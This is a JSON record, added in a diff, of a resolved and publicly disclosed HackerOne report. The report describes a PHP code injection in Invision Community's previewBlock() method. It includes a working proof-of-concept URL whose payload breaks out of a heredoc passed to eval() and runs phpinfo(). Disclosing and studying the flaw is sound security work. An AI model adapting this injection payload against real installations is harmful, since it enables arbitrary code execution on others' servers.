@@ -1,0 +1,131 @@
+{
+  "id": 1092574,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDkyNTc0",
+  "url": "https://hackerone.com/reports/1092574",
+  "title": "PHP Code Injection through \"previewBlock()\" method",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-02T00:04:38.432Z",
+  "submitted_at": "2021-02-02T00:04:38.493Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "egix",
+    "url": "/egix",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/431/9435ac0bb25492f164582fbbc7e3f6f8f016b1d1_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1387,
+    "url": "https://hackerone.com/ips",
+    "handle": "ips",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/387/0f494170758a5214a229b1403659c8a9254eeb4e_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/387/0f494170758a5214a229b1403659c8a9254eeb4e_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Invision Power Services, Inc.",
+      "twitter_handle": "invisionps",
+      "website": "http://www.invisioncommunity.com",
+      "about": "IPS is a leading provider of community solutions, including the popular Invision Community software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-05-28T16:50:01.312Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-04-28T16:49:58.400Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nThe vulnerability exists because the `IPS\\cms\\modules\\front\\pages\\_builder::previewBlock()` method allows to pass arbitrary content to the `IPS\\_Theme::runProcessFunction()` method, which will be used in a call to the `eval()` function. This can be exploited to inject and execute arbitrary PHP code.\n\n**Steps To Reproduce:**\n\n- Login as an user with permission to manage the sidebar \n- Browse to the following URL:\n\n```\nhttp://[host]/[ips]/index.php?app=cms&module=pages&controller=builder&do=previewBlock&block_plugin=stats&block_template_use_how=copy&block_plugin_app=core&_sending=block_content&block_content=RCE%0ACONTENT;}}phpinfo();die;/*\n```\n\n- This will result in the following PHP code to be passed to the `eval()` function from the `IPS\\_Theme::runProcessFunction()` method:\n\n```\nnamespace IPS\\Theme;\nclass class_content_template_for_block_\n{\n\tfunction run(  ) {\n\t\t$return = '';\n\t\t$return .= <<<CONTENT\n\nRCE\nCONTENT;}}phpinfo();die;/*\nCONTENT;\n\n\t\treturn $return;\n}}\n```\n\n- As a result, the `phpinfo()` function will be executed\n\n## Impact\n\nA malicious user might be able to inject and execute arbitrary PHP code. Successful exploitation of this vulnerability requires an account with permission to manage the sidebar (such as a Moderator or Administrator) and the \"cms\" application to be enabled.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-05-28T16:49:58.435Z",
+  "allow_singular_disclosure_after": -156119072.52240145,
+  "singular_disclosure_allowed": true,
+  "vote_count": 26,
+  "voters": [
+    "ali",
+    "akashhamal0x01",
+    "musab_alharany",
+    "xplo1t",
+    "f_m",
+    "ankitsingh",
+    "0nlymohammed",
+    "hundredpercent",
+    "majorisc",
+    "yusuf_furkan",
+    "and 16 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
